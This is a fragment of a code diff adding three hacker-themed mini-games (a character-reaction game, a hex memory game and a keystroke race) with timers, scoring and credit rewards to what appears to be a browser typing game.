+      $gameMemInput.style.display = 'none';
+      $gameMemInput.value = '';
+      $gamePrompt.style.display = '';
+      $gameHint.style.display = '';
+    }
+
+    function hideGameArena() {
+      $gamesList.style.display = '';
+      $gameArena.classList.remove('active');
+      stopGameTimer();
+      gameState.active = false;
+      gameState.currentGame = null;
+    }
+
+    function stopGameTimer() {
+      clearInterval(gameState.timerInterval);
+      gameState.timerInterval = null;
+    }
+
+    function startGameTimer(seconds, onTick, onEnd) {
+      stopGameTimer();
+      $gameTimerBar.style.width = '100%';
+      const TICK = 100;
+      const total = seconds * 1000;
+      let elapsed = 0;
+      gameState.timerInterval = setInterval(() => {
+        elapsed += TICK;
+        $gameTimerBar.style.width = Math.max(0, 100 - (elapsed / total) * 100) + '%';
+        if (onTick) onTick(elapsed);
+        if (elapsed >= total) { stopGameTimer(); if (onEnd) onEnd(); }
+      }, TICK);
+    }
+
+    /* ----- Game 1: Cipher Crack ----- */
+    function startCipherCrack() {
+      gameState.active = true;
+      gameState.currentGame = 'cipher';
+      gameState.round = 0;
+      gameState.score = 0;
+      gameState.lastGame = 'cipher';
+      showGameArena('CIPHER CRACK');
+      $gameHint.textContent = 'Press the highlighted character as fast as possible';
+      nextCipherRound();
+    }
+
+    function nextCipherRound() {
+      if (gameState.round >= CIPHER_ROUNDS) { endCipherCrack(); return; }
+      gameState.round++;
+      gameState.target = CIPHER_CHARS[Math.floor(Math.random() * CIPHER_CHARS.length)];
+      $gamePrompt.textContent = gameState.target;
+      $gameScore.textContent = `Round: ${gameState.round}/${CIPHER_ROUNDS}  ·  Score: ${gameState.score}`;
+      let resolved = false;
+      startGameTimer(CIPHER_ROUND_S, null, () => {
+        if (!resolved) { resolved = true; $gamePrompt.textContent = '✕'; setTimeout(nextCipherRound, CIPHER_TRANSITION_MS); }
+      });
+      gameState._cipherHit = () => {
+        if (resolved) return; resolved = true;
+        gameState.score++;
+        stopGameTimer();
+        $gamePrompt.textContent = '✓';
+        setTimeout(nextCipherRound, CIPHER_TRANSITION_MS);
+      };
+      gameState._cipherMiss = () => {
+        if (resolved) return; resolved = true;
+        stopGameTimer();
+        $gamePrompt.textContent = '✕';
+        setTimeout(nextCipherRound, CIPHER_TRANSITION_MS);
+      };
+    }
+
+    function endCipherCrack() {
+      gameState.active = false;
+      showGameResult('CIPHER CRACK COMPLETE',
+        `Correct: ${gameState.score}/${CIPHER_ROUNDS}\nAccuracy: ${Math.round(gameState.score / CIPHER_ROUNDS * 100)}%`,
+        gameState.score * 30);
+    }
+
+    /* ----- Game 2: Memory Buffer ----- */
+    function generateHexSeq(len) {
+      const H = '0123456789ABCDEF';
+      return Array.from({ length: len }, () => H[Math.floor(Math.random() * 16)]).join('');
+    }
+
+    function startMemoryBuffer() {
+      gameState.active = true;
+      gameState.currentGame = 'memory';
+      gameState.round = 0;
+      gameState.score = 0;
+      gameState.lastGame = 'memory';
+      showGameArena('MEMORY BUFFER');
+      $gameHint.textContent = 'Memorise the hex sequence, then type it';
+      nextMemoryRound();
+    }
+
+    function nextMemoryRound() {
+      if (gameState.round >= MEMORY_ROUNDS) { endMemoryBuffer(); return; }
+      gameState.round++;
+      const seqLen = MEMORY_BASE_SEQ_LEN + gameState.round; // 4, 5, 6, 7, 8
+      gameState.memorySeq = generateHexSeq(seqLen);
+      gameState.awaitingMemoryInput = false;
+      $gameMemInput.style.display = 'none';
+      $gameMemInput.value = '';
+      $gamePrompt.style.display = '';
+      $gamePrompt.textContent = gameState.memorySeq;
+      $gameHint.style.display = 'none';
+      $gameScore.textContent = `Round: ${gameState.round}/${MEMORY_ROUNDS}  ·  Score: ${gameState.score}`;
+      $gameTimerBar.style.width = '100%';
+      setTimeout(() => {
+        if (gameState.currentGame !== 'memory') return;
+        $gamePrompt.textContent = '·'.repeat(gameState.memorySeq.length);
+        $gameMemInput.style.display = '';
+        $gameHint.style.display = '';
+        $gameHint.textContent = `Type the sequence (${gameState.memorySeq.length} chars) then press Enter`;
+        $gameMemInput.focus();
+        gameState.awaitingMemoryInput = true;
+        startGameTimer(MEMORY_INPUT_S, null, () => { checkMemoryAnswer(); });
+      }, MEMORY_DISPLAY_MS);
+    }
+
+    function checkMemoryAnswer() {
+      if (!gameState.awaitingMemoryInput) return;
+      gameState.awaitingMemoryInput = false;
+      stopGameTimer();
+      const answer = $gameMemInput.value.trim().toUpperCase();
+      $gameMemInput.style.display = 'none';
+      $gameMemInput.value = '';
+      $gamePrompt.style.display = '';
+      if (answer === gameState.memorySeq) {
+        gameState.score++;
+        $gamePrompt.textContent = '✓';
+      } else {
+        $gamePrompt.textContent = gameState.memorySeq;
+      }
+      setTimeout(nextMemoryRound, MEMORY_NEXT_ROUND_MS);
+    }
+
+    function endMemoryBuffer() {
+      gameState.active = false;
+      showGameResult('MEMORY BUFFER COMPLETE',
+        `Correct: ${gameState.score}/${MEMORY_ROUNDS}\nAccuracy: ${Math.round(gameState.score / MEMORY_ROUNDS * 100)}%`,
+        gameState.score * 80);
+    }
+
+    /* ----- Game 3: Firewall Rush ----- */
+    function startFirewallRush() {
+      gameState.active = true;
+      gameState.currentGame = 'rush';
+      gameState.rushKeys = 0;
+      gameState.lastGame = 'rush';
+      showGameArena('FIREWALL RUSH');
+      $gamePrompt.textContent = '0';
+      $gameHint.textContent = 'Type as fast as you can!';
+      $gameScore.textContent = `Keys: 0  ·  Time: ${RUSH_DURATION_S}s`;
+      startGameTimer(RUSH_DURATION_S, elapsed => {
+        const secsLeft = Math.ceil((RUSH_DURATION_S * 1000 - elapsed) / 1000);
+        $gameScore.textContent = `Keys: ${gameState.rushKeys}  ·  Time: ${secsLeft}s`;
+      }, () => { endFirewallRush(); });
+    }
+
+    function endFirewallRush() {
+      gameState.active = false;
+      const reward = Math.min(RUSH_MAX_REWARD, gameState.rushKeys * RUSH_CREDITS_PER_KEY);
+      showGameResult('FIREWALL BREACHED',
+        `Keystrokes: ${gameState.rushKeys}\nCredits per key: ${RUSH_CREDITS_PER_KEY}`,
+        reward);
+    }
+
+    /* ----- Shared result screen ----- */
+    function showGameResult(title, stats, creditReward) {
+      stopGameTimer();
+      $gameArenaTitle.textContent = title;
+      $gameTimerBar.style.width = '0%';
+      $gamePrompt.style.display = 'none';
+      $gameScore.textContent = '';
+      $gameHint.style.display = 'none';
+      $gameMemInput.style.display = 'none';
+
+      // Apply shop multiplier to game rewards
+      const actual = Math.round(creditReward * state.multiplier);
+      $gameResultTitle.textContent = title;
+      $gameResultStats.textContent = stats;
+      $gameResultReward.textContent = actual > 0 ? '+' + actual + ' CREDITS EARNED' : 'NO CREDITS THIS TIME';
+
+      // Grant directly (games have their own natural cooldown — you had to play)
+      if (actual > 0) {
+        const prev = state.lifetimeCredits;
+        state.credits += actual;
+        state.lifetimeCredits += actual;
+        updateRewards();
+        showRewardToast('+' + actual + ' CREDITS — ' + title);
+        checkMilestones(prev);
+        checkLevelUp(prev);
+      }
+      $gameResult.classList.add('visible');
+    }
+
+    /* ----- Keyboard routing for games ----- */
+    function handleGameKey(key) {
+      const g = gameState.currentGame;
+      if (g === 'cipher') {
+        const k = key.toUpperCase();
+        if (k === gameState.target) {
+          gameState._cipherHit && gameState._cipherHit();
+        } else if (k.length === 1 && CIPHER_CHARS.includes(k)) {
+          gameState._cipherMiss && gameState._cipherMiss();
+        }
+      } else if (g === 'rush') {
+        if (key.length === 1) {
+          gameState.rushKeys++;
+          $gamePrompt.textContent = gameState.rushKeys;
+          if (state.soundOn && audioCtx) playKeyClick();
+        }
+      }
+    }
+
+    /* ----- Memory input events ----- */
+    $gameMemInput.addEventListener('keydown', e => {
+      if (e.key === 'Enter' && gameState.awaitingMemoryInput) {
+        e.preventDefault();
+        checkMemoryAnswer();
+      }
+    });
+
+    $gameMemInput.addEventListener('input', () => {
+      if (gameState.awaitingMemoryInput &&
+          $gameMemInput.value.length >= gameState.memorySeq.length) {
+        checkMemoryAnswer();
+      }
+    });
+
+    /* ----- Game UI event listeners ----- */
+    document.getElementById('games-btn').addEventListener('click', () => {
+      $gamesOverlay.classList.remove('hidden');
+    });
+
+    document.getElementById('games-close').addEventListener('click', () => {
+      if (gameState.active) { stopGameTimer(); gameState.active = false; hideGameArena(); }
+      $gamesOverlay.classList.add('hidden');
+    });
+
+    document.getElementById('games-list').addEventListener('click', e => {
+      const btn = e.target.closest('.game-play-btn');
+      if (!btn) return;
+      const game = btn.dataset.game;
+      if (game === 'cipher') startCipherCrack();
+      else if (game === 'memory') startMemoryBuffer();
+      else if (game === 'rush') startFirewallRush();
+    });
+
+    document.getElementById('game-play-again').addEventListener('click', () => {
+      const g = gameState.lastGame;
+      $gameResult.classList.remove('visible');
+      if (g === 'cipher') startCipherCrack();
+      else if (g === 'memory') startMemoryBuffer();
+      else if (g === 'rush') startFirewallRush();
+    });
+
+    document.getElementById('game-back-to-list').addEventListener('click', () => {
+      $gameResult.classList.remove('visible');
+      hideGameArena();
     });
 
     /* ── Window resize ────────────────────────────────────────── */
@@ -2776,6 +3919,8 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
     /* ── Init ─────────────────────────────────────────────────── */
     updateProgress();
     updateRewards();
+    updateStreakBadge();
+    renderShop();
 
   </script>
 </body>
